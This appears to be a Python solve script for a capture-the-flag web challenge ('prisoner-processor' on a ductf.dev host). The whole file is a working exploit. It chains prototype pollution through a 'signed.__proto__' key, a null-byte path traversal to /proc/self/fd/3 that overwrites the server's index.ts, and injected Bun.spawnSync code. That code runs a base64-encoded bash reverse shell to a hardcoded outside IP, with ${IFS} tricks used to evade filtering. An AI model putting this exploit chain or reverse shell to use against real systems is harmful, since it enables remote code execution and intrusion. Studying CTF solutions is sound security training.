import requests, base64
 
url = "https://web-prisoner-processor-827ee556e12a3f35.2024.ductf.dev"
rhost = "13.124.175.114"
rport = "8000"

r = requests.get( 
    f"{url}/examples"
)

base = r.json()["examples"][0] 

# Path Traversal & index.ts overwrite
base["data"]["signed.__proto__"] = {
    "outputPrefix" : "../../proc/self/fd/3\x00"
}

cmd = f"bash -i >& /dev/tcp/{rhost}/{rport} 0>&1"

payload = {
    "data": {
        "const a": "string = Bun.spawnSync({cmd:[\"bash\",\"-c\",\"echo${IFS}" + \
                    base64.b64encode(cmd.encode()).decode() + \
                   "${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash${IFS}-i\"]})/*",
        **base["data"],
        "asdf": "asdf*/"                       
    },
    "signature": base["signature"]
}

r = requests.post(
    f"{url}/convert-to-yaml", json=payload
)

base["data"]["signed.__proto__"]["outputPrefix"] = "../../proc/self/fd/3\\x"
r = requests.post(
    f"{url}/convert-to-yaml", json=payload
)
